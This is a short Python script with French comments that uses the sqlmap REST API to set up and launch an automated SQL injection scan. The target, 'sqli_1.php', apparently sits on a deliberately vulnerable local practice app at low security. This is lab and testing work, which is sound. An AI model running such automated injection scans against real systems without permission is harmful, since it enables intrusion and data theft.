import requests

# URL de base pour sqlmapapi
base_url = "http://127.0.0.1:8775"

# Créer une nouvelle tâche
response = requests.get(f"{base_url}/task/new")
task_id = response.json()['taskid']

if response.status_code == 200:
    print(f"Nouvelle tâche créée avec l'ID: {task_id}")

    # Définir les options pour la tâche
    options = {
        "url": "http://localhost/sqli_1.php",
        "cookie": "security=low; security_level=0; PHPSESSID=gskmdc5pu2md25ll3h7kjvtbj2",
        "forms": "1",
        "batch": "1"
    }

    response = requests.post(f"{base_url}/option/{task_id}/set", json=options)
    if response.status_code == 200:
        print("Options définies avec succès")

        # Démarrer le scan
        response = requests.post(f"{base_url}/scan/{task_id}/start", json={"url": "http://localhost/sqli_1.php"})
        if response.status_code == 200:
            print("Scan démarré avec succès")
        else:
            print("Échec du démarrage du scan")
    else:
        print("Échec de la définition des options")
else:
    print("Échec de la création d'une nouvelle tâche")
